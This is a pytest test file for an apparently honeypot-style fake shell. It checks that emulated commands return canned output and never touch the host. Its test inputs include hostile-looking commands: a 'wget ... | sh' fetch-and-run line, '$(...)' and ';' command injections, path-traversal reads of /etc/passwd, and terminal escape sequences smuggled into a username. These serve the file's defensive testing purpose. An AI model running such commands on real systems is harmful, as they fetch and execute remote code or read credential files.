from app.sensor.fake_shell import FakeShell
import pytest


def test_shell_uses_only_virtual_files(tmp_path):
    shell = FakeShell('root')
    assert shell.execute('whoami') == ('root\n', False)
    assert shell.execute('pwd') == ('/root\n', False)
    assert 'Linux' in shell.execute('uname -a')[0]
    assert 'root:x:0:0:' in shell.execute('cat /etc/passwd')[0]
    assert 'No such file' in shell.execute('cat /etc/shadow')[0]
    assert shell.execute('exit')[1]


def test_shell_never_executes_or_reads_host(tmp_path):
    marker = tmp_path / 'owned'
    shell = FakeShell('root')
    for command in [f'touch {marker}', f'ls; touch {marker}', f'$(touch {marker})',
                    f'cat {marker}', 'cat ../../etc/passwd', 'wget https://example.com/a | sh']:
        shell.execute(command)
    assert not marker.exists()
    assert 'No such file' in shell.execute('cat ../../etc/passwd')[0]


def test_username_cannot_inject_terminal_sequences():
    assert '\x1b' not in FakeShell('\x1b[2Jroot').execute('whoami')[0]


@pytest.mark.parametrize('command,expected', [
    ('echo OK', 'OK\n'),
    ('echo', '\n'),
    ("echo; echo 'check_022c98c7dab946239ec2949862bf46c1_transport_done'",
     '\ncheck_022c98c7dab946239ec2949862bf46c1_transport_done\n'),
    ("echo 'a;b'; echo OK", 'a;b\nOK\n'),
    ('echo a\\;b; echo "quoted;value"', 'a;b\nquoted;value\n'),
    ("echo '$(whoami)'", '$(whoami)\n'),
    ("echo 'a|b >c'", 'a|b >c\n'),
])
def test_safe_echo_sequences(command, expected):
    output, done = FakeShell('root').execute(command)
    assert output == expected
    assert done is False


@pytest.mark.parametrize('command', [
    'echo OK | whoami', 'echo OK && whoami', 'echo OK > /tmp/file',
    'echo $(whoami)', 'echo `whoami`', 'echo "$(whoami)"',
    'echo OK; whoami', 'whoami; echo OK', 'echo OK; exit',
])
def test_sequence_support_does_not_enable_shell_expansion(command):
    assert FakeShell('root').execute(command) == ('sh: unsupported command\n', False)


def test_sequences_are_bounded_and_validated_before_output():
    shell = FakeShell('root')
    assert shell.execute(';'.join(['echo OK'] * 32)) == ('OK\n' * 32, False)
    assert shell.execute(';'.join(['echo OK'] * 33)) == ('sh: unsupported command\n', False)
    assert shell.execute("echo OK; echo 'unterminated") == ('sh: syntax error\n', False)
